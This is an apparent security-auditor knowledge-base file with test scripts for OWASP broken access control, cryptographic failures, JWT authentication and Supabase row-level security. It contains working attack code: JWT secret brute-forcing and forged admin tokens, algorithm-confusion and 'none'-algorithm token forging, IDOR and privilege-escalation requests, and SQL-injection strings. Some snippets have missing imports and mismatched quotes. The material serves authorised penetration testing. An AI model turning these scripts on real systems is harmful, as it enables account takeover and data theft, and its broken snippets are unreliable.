# Security KB 01 — OWASP A01-A03: Access Control, Cryptographic Failures, Injection Intro

Source: extracted from the former `core-04-security-auditor.md` monolith (lines 1-476, 787-1013), enterprise security-auditor reference. Covers OWASP Top 10 2021 A01 (Broken Access Control), A02 (Cryptographic Failures), the A03 Injection category intro, and JWT authentication testing (logically grouped with access control since most JWT attacks are auth-bypass attacks).

---

## OWASP TOP 10 2021 TESTING

### Test 1: A01:2021 - Broken Access Control

**Source:** Research-added (OWASP Top 10 2021)

**Description:** Testing for privilege escalation, IDOR (Insecure Direct Object References), and unauthorized resource access.

**CVSS Base:** Critical (9.0-10.0)

**Test Cases:**

#### Test Case 1.1: Horizontal Privilege Escalation (IDOR)

```bash
# Scenario: User A accessing User B's resources

# Step 1: Login as User A and capture resource URL
curl -X GET "https://api.example.com/users/user-a-id/profile" \
  -H "Authorization: Bearer $USER_A_TOKEN"

# Step 2: Attempt to access User B's resources with User A's token
curl -X GET "https://api.example.com/users/user-b-id/profile" \
  -H "Authorization: Bearer $USER_A_TOKEN"

# Expected: 403 Forbidden
# Vulnerability: If returns 200 OK with User B's data = CRITICAL
```

#### Test Case 1.2: Vertical Privilege Escalation

```bash
# Scenario: Regular user accessing admin endpoints

# Step 1: Login as regular user
USER_TOKEN=$(curl -X POST "https://api.example.com/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"user@example.com","password":"password"}' \
  | jq -r '.accessToken')

# Step 2: Attempt admin operations
curl -X DELETE "https://api.example.com/admin/users/user-id" \
  -H "Authorization: Bearer $USER_TOKEN"

curl -X GET "https://api.example.com/admin/dashboard" \
  -H "Authorization: Bearer $USER_TOKEN"

# Expected: 403 Forbidden
# Vulnerability: If returns 200 OK = CRITICAL
```

#### Test Case 1.3: Forced Browsing

```bash
# Test accessing restricted URLs without authentication

# Common admin/sensitive paths
PATHS=(
  "/admin"
  "/admin/dashboard"
  "/admin/users"
  "/api/admin"
  "/dashboard"
  "/config"
  "/settings"
  "/.env"
  "/api/internal"
)

for path in "${PATHS[@]}"; do
  echo "Testing: $path"
  curl -I "https://example.com$path"
done

# Expected: 401 Unauthorized or 403 Forbidden
# Vulnerability: Any 200 OK response = HIGH
```

#### Test Case 1.4: JWT Manipulation for Role Escalation

```typescript
// Test JWT payload manipulation
import jwt from 'jsonwebtoken';

// Capture legitimate JWT token
const capturedToken = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...";

// Decode without verification
const decoded = jwt.decode(capturedToken);
console.log("Original payload:", decoded);
// { userId: "user-123", email: "user@example.com", role: "user" }

// Attempt 1: Modify role in payload
const maliciousPayload = {
  ...decoded,
  role: "admin"  // Changed from "user" to "admin"
};

// Attempt 2: Re-sign with guessed/weak secret
const weakSecrets = ["secret", "password", "123456", "admin", "test"];

for (const secret of weakSecrets) {
  try {
    const maliciousToken = jwt.sign(maliciousPayload, secret);

    // Test with modified token
    const response = await fetch("https://api.example.com/admin/users", {
      headers: { "Authorization": `Bearer ${maliciousToken}` }
    });

    if (response.ok) {
      console.log(`CRITICAL: Weak JWT secret found: ${secret}`);
    }
  } catch (err) {
    // Secret doesn't match
  }
}
```

**Automated Test Script:**

```python
# automated_access_control_test.py
import requests

def test_idor_vulnerability(base_url, user_a_token, user_b_id):
    """Test Insecure Direct Object Reference"""

    # Attempt to access another user's resource
    response = requests.get(
        f"{base_url}/users/{user_b_id}/profile",
        headers={"Authorization": f"Bearer {user_a_token}"}
    )

    if response.status_code == 200:
        return {
            "vulnerability": "IDOR - Horizontal Privilege Escalation",
            "severity": "CRITICAL",
            "cvss": 9.1,
            "description": f"User A can access User B's profile at /users/{user_b_id}/profile",
            "recommendation": "Implement resource ownership validation before returning data"
        }

    return {"status": "PASS"}

def test_vertical_privilege_escalation(base_url, user_token):
    """Test admin endpoint access with user token"""

    admin_endpoints = [
        "/admin/users",
        "/admin/dashboard",
        "/admin/settings",
        "/api/admin/delete-user",
        "/api/admin/grant-permissions"
    ]

    vulnerabilities = []

    for endpoint in admin_endpoints:
        response = requests.get(
            f"{base_url}{endpoint}",
            headers={"Authorization": f"Bearer {user_token}"}
        )

        if response.status_code == 200:
            vulnerabilities.append({
                "endpoint": endpoint,
                "severity": "CRITICAL",
                "cvss": 9.8
            })

    if vulnerabilities:
        return {
            "vulnerability": "Vertical Privilege Escalation",
            "affected_endpoints": vulnerabilities,
            "recommendation": "Implement role-based access control (RBAC) middleware"
        }

    return {"status": "PASS"}

# Usage
results = []
results.append(test_idor_vulnerability("https://api.example.com", USER_A_TOKEN, "user-b-id"))
results.append(test_vertical_privilege_escalation("https://api.example.com", USER_TOKEN))

print(json.dumps(results, indent=2))
```

**Best Practices:**
- DO: Test with multiple user roles (guest, user, admin, moderator)
- DO: Test both horizontal (same role) and vertical (different roles) escalation
- DO: Test direct object references (IDs in URLs, query params, body)
- DO: Test forced browsing with common admin paths
- DO: Test JWT payload manipulation
- DON'T: Stop after first vulnerability - enumerate all endpoints
- DON'T: Only test authenticated paths - test anonymous access too

---

### Test 2: A02:2021 - Cryptographic Failures

**Source:** Research-added (OWASP Top 10 2021)

**Description:** Testing for weak encryption, insecure protocols, hardcoded secrets, and cryptographic misconfigurations.

**CVSS Base:** High (7.0-8.9)

**Test Cases:**

#### Test Case 2.1: TLS/SSL Configuration Testing

```bash
# Test SSL/TLS configuration with testssl.sh
./testssl.sh --full https://api.example.com

# Manual checks
# 1. Test for SSLv2/SSLv3 (deprecated)
nmap --script ssl-enum-ciphers -p 443 api.example.com

# 2. Test for weak ciphers
openssl s_client -connect api.example.com:443 -cipher 'DES-CBC3-SHA'
# Expected: Connection refused for weak ciphers

# 3. Verify TLS 1.2+ only
curl -v --tlsv1.0 --tls-max 1.0 https://api.example.com
# Expected: SSL handshake failure

curl -v --tlsv1.2 https://api.example.com
# Expected: Success

# 4. Check certificate validity
openssl s_client -connect api.example.com:443 -showcerts
```

#### Test Case 2.2: Hardcoded Secrets Detection

```bash
# Scan codebase for hardcoded secrets

# Using truffleHog
trufflehog git file://. --json --regex --entropy=True

# Using git-secrets
git secrets --scan

# Manual regex patterns
grep -r "password.*=.*['\"]" .
grep -r "api_key.*=.*['\"]" .
grep -r "secret.*=.*['\"]" .
grep -r "token.*=.*['\"]" .

# Check for AWS keys
grep -r "AKIA[0-9A-Z]{16}" .

# Check for private keys
find . -name "*.pem" -o -name "*_rsa" -o -name "*.key"
```

**Automated Script:**

```python
# crypto_failures_test.py
import ssl
import socket
import re

def test_tls_version(hostname, port=443):
    """Test supported TLS versions"""

    protocols = {
        "SSLv2": ssl.PROTOCOL_SSLv2,  # Deprecated
        "SSLv3": ssl.PROTOCOL_SSLv3,  # Deprecated
        "TLSv1.0": ssl.PROTOCOL_TLSv1,  # Weak
        "TLSv1.1": ssl.PROTOCOL_TLSv1_1,  # Weak
        "TLSv1.2": ssl.PROTOCOL_TLSv1_2,  # Acceptable
        "TLSv1.3": ssl.PROTOCOL_TLS  # Recommended
    }

    vulnerabilities = []

    for name, protocol in protocols.items():
        try:
            context = ssl.SSLContext(protocol)
            with socket.create_connection((hostname, port)) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    if name in ["SSLv2", "SSLv3", "TLSv1.0", "TLSv1.1"]:
                        vulnerabilities.append({
                            "vulnerability": f"Weak protocol {name} enabled",
                            "severity": "HIGH",
                            "cvss": 7.4,
                            "recommendation": "Disable protocols older than TLS 1.2"
                        })
        except:
            pass  # Protocol not supported (good)

    return vulnerabilities

def scan_hardcoded_secrets(directory):
    """Scan for hardcoded secrets in code"""

    patterns = {
        "password": r'password\s*=\s*["\']([^"\']+)["\']',
        "api_key": r'api[_-]?key\s*=\s*["\']([^"\']+)["\']',
        "secret": r'secret\s*=\s*["\']([^"\']+)["\']',
        "jwt_secret": r'jwt[_-]?secret\s*=\s*["\']([^"\']+)["\']',
        "aws_access_key": r'(AKIA[0-9A-Z]{16})',
        "private_key": r'-----BEGIN PRIVATE KEY-----'
    }

    findings = []

    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith(('.ts', '.js', '.tsx', '.jsx', '.env', '.config')):
                filepath = os.path.join(root, file)

                with open(filepath, 'r') as f:
                    content = f.read()

                    for pattern_name, pattern in patterns.items():
                        matches = re.findall(pattern, content, re.IGNORECASE)

                        if matches:
                            findings.append({
                                "file": filepath,
                                "type": pattern_name,
                                "matches": len(matches),
                                "severity": "CRITICAL",
                                "cvss": 9.8,
                                "recommendation": "Move secrets to environment variables or secret manager"
                            })

    return findings
```

#### Test Case 2.3: Weak Hashing Algorithms

```javascript
// Test password hashing strength
const crypto = require('crypto');
const bcrypt = require('bcrypt');

async function testPasswordHashing(apiUrl) {
  // Create test account with known password
  const testPassword = "TestPassword123!";

  const response = await fetch(`${apiUrl}/auth/signup`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      email: 'security-test@example.com',
      password: testPassword
    })
  });

  // Retrieve user from database (if you have DB access)
  const user = await db.users.findOne({ email: 'security-test@example.com' });

  // Analyze hash
  const passwordHash = user.password_hash;

  // Check hash length and format
  if (passwordHash.length === 32) {
    console.log("CRITICAL: MD5 hash detected (32 chars hex)");
    return { vulnerability: "Weak hashing (MD5)", cvss: 8.1 };
  }

  if (passwordHash.length === 40) {
    console.log("CRITICAL: SHA-1 hash detected (40 chars hex)");
    return { vulnerability: "Weak hashing (SHA-1)", cvss: 7.4 };
  }

  if (!passwordHash.startsWith('$2a$') && !passwordHash.startsWith('$2b$')) {
    console.log("WARNING: Not using bcrypt");
    return { vulnerability: "Non-standard password hashing", cvss: 6.5 };
  }

  // Check bcrypt rounds
  const rounds = parseInt(passwordHash.split('$')[2]);
  if (rounds < 10) {
    console.log("MEDIUM: bcrypt rounds too low");
    return { vulnerability: `Weak bcrypt rounds (${rounds})`, cvss: 5.3 };
  }

  console.log("PASS: Strong password hashing detected");
  return { status: "PASS" };
}
```

**Best Practices:**
- DO: Test all TLS versions (ensure only TLS 1.2+ accepted)
- DO: Scan entire codebase for hardcoded secrets
- DO: Test certificate validation (no self-signed in production)
- DO: Verify strong cipher suites only
- DO: Check password hashing algorithm (bcrypt/Argon2)
- DON'T: Trust HTTPS alone - verify strong TLS configuration
- DON'T: Ignore .git directories - check for leaked secrets

---

### Test 3: A03:2021 - Injection (intro)

**Source:** Research-added (OWASP Top 10 2021) + Extracted from Backend Specialist

**Description:** Testing for SQL injection, NoSQL injection, command injection, and LDAP injection.

**CVSS Base:** Critical (9.0-10.0)

See `security-kb-02-injection-sqli-nosqli.md` for full SQL/NoSQL injection test suites.

---

## JWT AUTHENTICATION TESTING

### Test 1: JWT Secret Brute Force

**Source:** Extracted from Backend Specialist JWT patterns

**Description:** Testing JWT signature with common/weak secrets.

**Implementation:**

```typescript
// jwt_brute_force.ts
import jwt from 'jsonwebtoken';

async function bruteForceJWTSecret(token: string): Promise<string | null> {
  // Common weak secrets
  const commonSecrets = [
    "secret",
    "password",
    "123456",
    "admin",
    "jwt_secret",
    "your-256-bit-secret",
    "supersecret",
    "change-me",
    "development",
    "test",
    "secretkey",
    "qwerty"
  ];

  // Try each secret
  for (const secret of commonSecrets) {
    try {
      const decoded = jwt.verify(token, secret);
      console.log(`CRITICAL: Weak JWT secret found: "${secret}"`);
      console.log(`Decoded payload:`, decoded);

      return secret;
    } catch (err) {
      // Secret doesn't match, continue
    }
  }

  return null;
}

// Test with captured JWT
const capturedToken = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...";
const foundSecret = await bruteForceJWTSecret(capturedToken);

if (foundSecret) {
  // Generate malicious token with elevated privileges
  const maliciousPayload = {
    userId: "user-123",
    email: "attacker@example.com",
    role: "admin"  // Escalated from "user"
  };

  const maliciousToken = jwt.sign(maliciousPayload, foundSecret);

  console.log("Malicious token:", maliciousToken);
}
```

### Test 2: JWT Algorithm Confusion Attack

**Source:** Research-added (JWT security best practices)

```typescript
// jwt_algorithm_confusion.ts
import jwt from 'jsonwebtoken';
import fs from 'fs';

/**
 * Test Algorithm Confusion (RS256 → HS256)
 *
 * If server uses RS256 (asymmetric) but accepts HS256 (symmetric),
 * attacker can use public key as HMAC secret
 */
async function testAlgorithmConfusion(token: string, publicKey: string) {
  // Decode token without verification
  const decoded = jwt.decode(token, { complete: true });

  if (!decoded || decoded.header.alg !== 'RS256') {
    console.log("Token is not RS256");
    return;
  }

  // Create malicious payload
  const maliciousPayload = {
    ...decoded.payload,
    role: "admin"  // Escalate privilege
  };

  // Re-sign with HS256 using PUBLIC key as secret
  const maliciousToken = jwt.sign(
    maliciousPayload,
    publicKey,  // Using PUBLIC key as HMAC secret
    { algorithm: 'HS256' }
  );

  console.log("Malicious HS256 token:", maliciousToken);

  // Test if server accepts it
  const response = await fetch("https://api.example.com/admin/users", {
    headers: {
      "Authorization": `Bearer ${maliciousToken}`
    }
  });

  if (response.ok) {
    console.log("CRITICAL: Algorithm confusion vulnerability!");
    return {
      vulnerability: "JWT Algorithm Confusion (RS256 → HS256)",
      severity: "CRITICAL",
      cvss: 9.8,
      recommendation: "Explicitly validate token algorithm in verification"
    };
  }
}
```

### Test 3: JWT None Algorithm Attack

**Source:** Research-added

```typescript
// jwt_none_algorithm.ts

/**
 * Test 'none' algorithm acceptance
 *
 * Some JWT libraries accept alg: "none" which skips signature verification
 */
function createNoneAlgToken(payload: any): string {
  const header = {
    alg: "none",
    typ: "JWT"
  };

  const encodedHeader = Buffer.from(JSON.stringify(header)).toString('base64url');
  const encodedPayload = Buffer.from(JSON.stringify(payload)).toString('base64url');

  // No signature for "none" algorithm
  return `${encodedHeader}.${encodedPayload}.`;
}

// Test
const maliciousPayload = {
  userId: "admin-id",
  email: "admin@example.com",
  role: "admin",
  exp: Math.floor(Date.now() / 1000) + 3600
};

const noneAlgToken = createNoneAlgToken(maliciousPayload);

// Test if server accepts it
const response = await fetch("https://api.example.com/admin/users", {
  headers: {
    "Authorization": `Bearer ${noneAlgToken}`
  }
});

if (response.ok) {
  console.log("CRITICAL: Server accepts 'none' algorithm!");
  // Vulnerability found
}
```

### Test 4: JWT Expiration Testing

**Source:** Extracted from Backend Specialist JWT patterns

```typescript
// jwt_expiration_test.ts

async function testJWTExpiration() {
  // Step 1: Login and get valid token
  const loginResponse = await fetch("https://api.example.com/auth/login", {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      email: 'test@example.com',
      password: 'password123'
    })
  });

  const { accessToken } = await loginResponse.json();

  // Step 2: Wait for token to expire (access tokens should expire in 15 min)
  console.log("Waiting for token expiration (15 minutes)...");
  await new Promise(resolve => setTimeout(resolve, 16 * 60 * 1000));

  // Step 3: Attempt to use expired token
  const testResponse = await fetch("https://api.example.com/api/protected", {
    headers: {
      "Authorization": `Bearer ${accessToken}`
    }
  });

  if (testResponse.ok) {
    return {
      vulnerability: "JWT tokens not expiring",
      severity": "HIGH",
      cvss: 7.5,
      recommendation": "Implement short-lived access tokens (15 min) with refresh tokens"
    };
  }

  console.log("PASS: Expired tokens correctly rejected");
}
```

**Best Practices:**
- DO: Test for weak JWT secrets
- DO: Test algorithm confusion (RS256 → HS256)
- DO: Test 'none' algorithm acceptance
- DO: Verify token expiration enforcement
- DO: Test token revocation (logout)
- DO: Check for sensitive data in JWT payload
- DON'T: Skip testing refresh token security
- DON'T: Assume HTTPS protects weak JWT secrets

---

## ACCESS CONTROL TESTING

### Test 1: Row-Level Security (RLS) Bypass

**Source:** Extracted from Backend Specialist RLS patterns

**Description:** Testing PostgreSQL/Supabase RLS policies for bypass vulnerabilities.

**Test Cases:**

#### Test Case 1.1: User-Scoped RLS Bypass

```sql
-- Test if RLS policies can be bypassed

-- Setup: Create two test users
INSERT INTO auth.users (id, email) VALUES
  ('user-a-id', 'usera@example.com'),
  ('user-b-id', 'userb@example.com');

-- Setup: Create test data
INSERT INTO posts (id, user_id, title, content) VALUES
  ('post-1', 'user-a-id', 'User A Post', 'Content A'),
  ('post-2', 'user-b-id', 'User B Post', 'Content B');

-- Test 1: Attempt to query as User A
SET LOCAL role authenticated;
SET LOCAL request.jwt.claims TO '{"sub": "user-a-id"}';

SELECT * FROM posts WHERE id = 'post-2';
-- Expected: 0 rows (User A shouldn't see User B's post)
-- Vulnerability: If returns post-2 = CRITICAL RLS bypass

-- Test 2: Attempt SQL injection to bypass RLS
SELECT * FROM posts WHERE id = 'post-1' OR '1'='1';
-- Expected: Only post-1 returned
-- Vulnerability: If returns all posts = RLS bypass

-- Test 3: Attempt to update another user's post
UPDATE posts SET title = 'Hacked' WHERE id = 'post-2';
-- Expected: 0 rows updated
-- Vulnerability: If updated = CRITICAL

RESET role;
```

#### Test Case 1.2: Team-Based RLS Bypass

```typescript
// test_team_rls.ts
import { createClient } from '@supabase/supabase-js';

async function testTeamRLSBypass() {
  // Setup: User A in Team 1, User B in Team 2
  const userA = createClient(SUPABASE_URL, SUPABASE_KEY, {
    auth: { persistSession: false }
  });

  const userB = createClient(SUPABASE_URL, SUPABASE_KEY, {
    auth: { persistSession: false }
  });

  // Login as User A
  await userA.auth.signInWithPassword({
    email: 'usera@example.com',
    password: 'password'
  });

  // User A creates project in Team 1
  const { data: project } = await userA
    .from('projects')
    .insert({
      team_id: 'team-1-id',
      name: 'Team 1 Project'
    })
    .select()
    .single();

  // Login as User B (Team 2)
  await userB.auth.signInWithPassword({
    email: 'userb@example.com',
    password: 'password'
  });

  // Test: User B attempts to access Team 1's project
  const { data: unauthorizedAccess, error } = await userB
    .from('projects')
    .select('*')
    .eq('id', project.id)
    .single();

  if (unauthorizedAccess && !error) {
    console.log("CRITICAL: RLS Bypass - User B accessed Team 1's project!");
    return {
      vulnerability: "RLS Policy Bypass - Team Isolation Failure",
      severity: "CRITICAL",
      cvss: 9.1,
      affected_table: "projects",
      recommendation: "Review and strengthen RLS policies with team_members join"
    };
  }

  // Test: User B attempts to update Team 1's project
  const { error: updateError } = await userB
    .from('projects')
    .update({ name: 'Hacked Project' })
    .eq('id', project.id);

  if (!updateError) {
    console.log("CRITICAL: RLS Bypass - User B updated Team 1's project!");
    return {
      vulnerability: "RLS Policy Bypass - Write Access Violation",
      severity: "CRITICAL",
      cvss: 9.8
    };
  }

  console.log("PASS: RLS policies correctly enforced");
}
```

### Test 2: API Authorization Bypass

**Source:** Extracted from Backend Specialist + Research

```bash
# Test API authorization bypass

# Test 1: Missing Authorization header
curl -X GET "https://api.example.com/api/protected/users"
# Expected: 401 Unauthorized
# Vulnerability: If returns data = CRITICAL

# Test 2: Invalid/malformed token
curl -X GET "https://api.example.com/api/protected/users" \
  -H "Authorization: Bearer invalid-token"
# Expected: 401 Unauthorized

# Test 3: Expired token
curl -X GET "https://api.example.com/api/protected/users" \
  -H "Authorization: Bearer $EXPIRED_TOKEN"
# Expected: 401 Unauthorized with "Token expired" message

# Test 4: Token from different application
curl -X GET "https://api.example.com/api/protected/users" \
  -H "Authorization: Bearer $TOKEN_FROM_OTHER_APP"
# Expected: 401 Unauthorized

# Test 5: Authorization header in wrong format
curl -X GET "https://api.example.com/api/protected/users" \
  -H "Authorization: $TOKEN_WITHOUT_BEARER"
# Expected: 401 Unauthorized
```

**Automated Script:**

```python
# authorization_bypass_test.py

def test_authorization_bypass(api_url, valid_token):
    """Test various authorization bypass scenarios"""

    test_cases = [
        {
            "name": "No Authorization Header",
            "headers": {},
            "expected_status": 401
        },
        {
            "name": "Invalid Token",
            "headers": {"Authorization": "Bearer invalid-token-12345"},
            "expected_status": 401
        },
        {
            "name": "Malformed Header (No Bearer)",
            "headers": {"Authorization": "token-without-bearer"},
            "expected_status": 401
        },
        {
            "name": "Empty Token",
            "headers": {"Authorization": "Bearer "},
            "expected_status": 401
        },
        {
            "name": "SQL Injection in Token",
            "headers": {"Authorization": "Bearer ' OR '1'='1"},
            "expected_status": 401
        }
    ]

    vulnerabilities = []

    for test in test_cases:
        response = requests.get(
            f"{api_url}/api/protected/users",
            headers=test["headers"]
        )

        if response.status_code != test["expected_status"]:
            vulnerabilities.append({
                "test": test["name"],
                "expected": test["expected_status"],
                "actual": response.status_code,
                "severity": "CRITICAL" if response.status_code == 200 else "HIGH",
                "cvss": 9.8 if response.status_code == 200 else 7.5
            })

    return vulnerabilities
```

**Best Practices:**
- DO: Test RLS policies with multiple user accounts
- DO: Test both SELECT and INSERT/UPDATE/DELETE operations
- DO: Test with SQL injection attempts to bypass RLS
- DO: Verify API authorization on ALL protected endpoints
- DO: Test with expired/invalid/missing tokens
- DO: Test cross-team/cross-user data access
- DON'T: Trust client-side checks - always test server-side
- DON'T: Assume RLS works - actively test bypass scenarios
